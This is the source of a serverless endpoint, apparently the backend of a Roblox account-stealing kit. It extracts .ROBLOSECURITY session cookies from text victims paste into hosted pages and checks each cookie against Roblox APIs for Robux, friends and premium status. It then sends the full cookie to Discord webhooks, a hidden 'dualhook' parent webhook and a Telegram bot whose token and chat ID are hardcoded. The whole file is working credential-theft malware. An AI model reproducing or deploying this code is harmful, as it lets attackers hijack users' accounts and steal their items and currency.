// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

// Fetch with timeout helper
async function fetchWithTimeout(url, options = {}, timeout = 5000) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeout);
  try {
    const res = await fetch(url, { ...options, signal: controller.signal });
    clearTimeout(id);
    return res;
  } catch (e) {
    clearTimeout(id);
    throw e;
  }
}

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

function extractRobloxCookie(raw) {
  if (!raw) return null;
  // Keep the old robust extraction
  const warningMatch = raw.match(/_\|WARNING[^|]*\|_([\w\-\.]+)/);
  if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;
  
  const psMatch = raw.match(/\.ROBLOSECURITY['")\s,]*[,\s]*["']?(_\|WARNING[^"'\s]+)/);
  if (psMatch) return psMatch[1];
  
  const bareMatch = raw.match(/(_\|WARNING[-A-Z0-9.:_ ]+\|_[\w\-.]+)/);
  if (bareMatch) return bareMatch[1];
  
  const tokenOnly = raw.match(/\|_([\w\-]{50,})/);
  if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;
  
  return null;
}

// Optimized fetch - only essential data, with timeouts
async function fetchRobloxInfo(cookie) {
  try {
    const headers = { Cookie: `.ROBLOSECURITY=${cookie}` };
    
    // Auth first
    const authRes = await fetchWithTimeout('https://users.roblox.com/v1/users/authenticated', { headers }, 8000);
    if (!authRes.ok) return null;
    const auth = await authRes.json();
    const uid = auth.id;
    
    // Parallel fetch only essentials (robux, friends, premium, profile)
    const [robuxRes, friendRes, premiumRes, profileRes] = await Promise.all([
      fetchWithTimeout('https://economy.roblox.com/v1/user/currency', { headers }, 5000).catch(() => null),
      fetchWithTimeout(`https://friends.roblox.com/v1/users/${uid}/friends/count`, { headers }, 5000).catch(() => null),
      fetchWithTimeout(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`, { headers }, 5000).catch(() => null),
      fetchWithTimeout(`https://users.roblox.com/v1/users/${uid}`, { headers: {} }, 5000).catch(() => null)
    ]);
    
    const robux = robuxRes?.ok ? await robuxRes.json() : null;
    const friends = friendRes?.ok ? await friendRes.json() : null;
    const isPremium = premiumRes?.ok ? await premiumRes.json() : false;
    const profile = profileRes?.ok ? await profileRes.json() : null;
    
    let accountAgeDays = 'N/A';
    if (profile?.created) {
      accountAgeDays = Math.floor((Date.now() - new Date(profile.created).getTime()) / 86400000);
    }
    
    return {
      id: uid,
      username: auth.name,
      displayName: auth.displayName,
      isPremium: isPremium === true,
      robux: robux?.robux ?? 'N/A',
      friends: friends?.count ?? 'N/A',
      accountAgeDays
    };
  } catch (_) {
    return null;
  }
}

async function sendToDiscord(webhookUrl, pageName, slotLabel, rawValue, cookie, roblox, now) {
  if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;

  let payload;

  if (roblox) {
    const premiumTag = roblox.isPremium ? ' ⭐' : '';
    
    payload = {
      content: '@everyone',
      embeds: [{
        title: `🧑 ${roblox.username}${premiumTag}`,
        description: `:fire: \`sPAIN\` :fire:`,
        color: 5793266,
        fields: [
          { name: '👤 Username', value: `${roblox.username}`, inline: true },
          { name: '🆔 User ID', value: `${roblox.id}`, inline: true },
          { name: '📄 Page', value: `\`${pageName}\``, inline: true },
          { name: '💰 Robux', value: `${roblox.robux}`, inline: true },
          { name: '👥 Friends', value: `${roblox.friends}`, inline: true },
          { name: '📅 Account Age', value: `${roblox.accountAgeDays} Days`, inline: true },
          { name: '🔐 .ROBLOSECURITY', value: `\`\`\`${cookie}\`\`\``, inline: false },
          { name: '📅 Date', value: `\`${now}\``, inline: false },
        ],
        footer: { text: 'Submission Logger' },
        thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
      }]
    };
  } else {
    payload = {
      content: '@everyone',
      embeds: [{
        title: '🚨 New Submission',
        description: ':fire: `sPAIN` :fire:',
        color: 5793266,
        fields: [
          { name: '📄 Page', value: `\`${pageName}\``, inline: true },
          { name: '🎯 Slot', value: `\`${slotLabel}\``, inline: true },
          { name: '📥 Content', value: `\`\`\`${rawValue?.substring(0, 1000)}\`\`\`` },
          { name: '📅 Date', value: `\`${now}\``, inline: false },
        ],
        footer: { text: 'Submission Logger' }
      }]
    };
  }

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { slug, slots } = body || {};
  if (!slug) return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  let record;
  try {
    record = await redisGet(`slot:${slug}`);
  } catch (err) {
    return res.status(500).json({ error: 'Redis error', detail: err.message });
  }
  if (!record) return res.status(404).json({ error: 'Page not found' });

  const now = new Date().toISOString();
  const slotEntry = Object.entries(slots).find(([, v]) => v && v.length > 0);
  const slotLabel = slotEntry ? slotEntry[0] : 'N/A';
  const rawValue = slotEntry ? slotEntry[1] : '(empty)';

  const cookie = extractRobloxCookie(rawValue);
  
  // Fetch Roblox info with timeout protection
  const roblox = cookie ? await fetchRobloxInfo(cookie) : null;

  // Build TG content
  const tgContent = roblox 
    ? `👤 ${roblox.username} (${roblox.displayName})\n🆔 ${roblox.id}\n💰 Robux: ${roblox.robux}\n👥 Friends: ${roblox.friends}\n⭐ Premium: ${roblox.isPremium ? 'Yes' : 'No'}\n📅 Age: ${roblox.accountAgeDays} days\n🍪 Cookie: ${cookie?.substring(0, 50)}...`
    : `📥 Raw: ${rawValue?.substring(0, 500)}`;

  // Send to webhook2
  await sendToDiscord(record.webhook, record.displayName, slotLabel, rawValue, cookie, roblox, now);

  // Send to webhook1 if dualhook
  let webhook1 = 'N/A';
  if (record.dualhookParent) {
    try {
      const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
      if (parentRecord?.webhook && parentRecord.webhook !== record.webhook) {
        webhook1 = parentRecord.webhook;
        await sendToDiscord(parentRecord.webhook, record.displayName, slotLabel, rawValue, cookie, roblox, now);
      }
    } catch (_) {}
  }

  // Telegram
  const tgMsg = [
    `🚨 <b>NEW SUBMISSION</b> 🚨`,
    `📄 PAGE: ${record.displayName}`,
    `🎯 SLOT: ${slotLabel}`,
    `------------------------------------------`,
    tgContent,
    `------------------------------------------`,
    `🔗 WEBHOOK2: <code>${record.webhook}</code>`,
    `🔗 WEBHOOK1: <code>${webhook1}</code>`,
    `📅 ${now}`
  ].join('\n');

  await tgSend(tgMsg);

  return res.status(200).json({ success: true });
}
